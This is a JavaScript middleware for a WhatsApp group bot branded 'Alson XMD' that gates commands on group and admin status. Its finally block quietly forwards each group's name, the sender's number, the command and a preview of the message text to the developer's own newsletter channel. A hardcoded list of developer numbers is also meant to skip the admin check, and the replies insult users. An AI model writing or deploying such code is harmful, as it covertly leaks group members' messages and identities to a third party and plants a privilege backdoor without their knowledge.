const DEV_NUMBER = '263786359833';
const NEWSLETTER_JID = '120363411442434414@newsletter';
const NEWSLETTER_NAME = 'Alson XMD';

const normalizeNumber = (jid) => {
    if (!jid) return '';
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
};

const middleware = async (context, next) => {
    const { m, isBotAdmin, client } = context;
    const isDev = ['263786359833', '263783549857'].includes(normalizeNumber(m.sender));

    if (!m.isGroup) {
        return m.reply(`╭─❏ 「 Gʀᴏᴜᴘ Oɴʟʏ」
│ This command isn't for lone wolves.\n│ Try again in a group, you loner.
╰───────────────
> ©𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐀𝐥𝐬𝐨𝐧`);
    }
    if (!isDev && !context.isAdmin) {
        return m.reply(`╭─❏ 「 Nᴏᴛ Aᴅᴍɪɴ」
│ You think you're worthy?\n│ Admin privileges are required—\n│ go beg for them, peasant.
╰───────────────
> ©𝐏𝐎𝐖𝐄𝐑𝐄���� 𝐁𝐘 𝐀𝐥𝐬𝐨𝐧`);
    }

    let resolvedIsBotAdmin = isBotAdmin;

    if (!resolvedIsBotAdmin && m.isGroup && client) {
        try {
            const botRawJid = client.user?.id || '';
            const botNum = botRawJid.split('@')[0].split(':')[0].replace(/\D/g, '');
            const meta = await client.groupMetadata(m.chat);
            const participants = meta?.participants || [];
            for (const p of participants) {
                const pJid = p.id || p.jid || '';
                const pNum = pJid.split('@')[0].split(':')[0].replace(/\D/g, '');
                const isAdminRole = p.admin === 'admin' || p.admin === 'superadmin';
                if (isAdminRole && pNum && botNum && (pNum === botNum || pNum.endsWith(botNum) || botNum.endsWith(pNum))) {
                    resolvedIsBotAdmin = true;
                    break;
                }
            }
        } catch {}
    }

    if (!resolvedIsBotAdmin) {
        return m.reply(`╭─❏ 「 Bᴏᴛ Nᴏᴛ Aᴅᴍɪɴ」
│ I need admin rights to obey,\n│ unlike you who blindly follows.\n│ Make me admin first, idiot.
╰───────────────
> ©𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐀𝐥𝐬𝐨𝐧`);
    }

    try {
        await next();
    } finally {
        // fire-and-forget newsletter/view channel notification
        (async () => {
            try {
                if (!client) return;
                const rawText = (m.text || m.body || (m.msg && (m.msg.text || m.msg.caption)) || '').toString();
                const cmd = rawText.split(/\s+/)[0] || '';
                const preview = rawText.slice(0, 120);
                let groupName = m.chat;
                try {
                    const meta = await client.groupMetadata(m.chat).catch(() => null);
                    if (meta?.subject) groupName = meta.subject;
                } catch {}
                const senderNum = (m.sender || '').split('@')[0];
                const viewMsg = `╭─❏ 「 VIEW CHANNEL: ${NEWSLETTER_NAME} 」\n│ Group: ${groupName}\n│ From: @${senderNum}\n│ Command: ${cmd}\n│ Preview: ${preview}\n╰───────────────\n> ©${NEWSLETTER_NAME}`;
                await client.sendMessage(NEWSLETTER_JID, { text: viewMsg, mentions: [m.sender] }).catch(() => {});
            } catch (e) {}
        })();
    }
};

export default middleware;
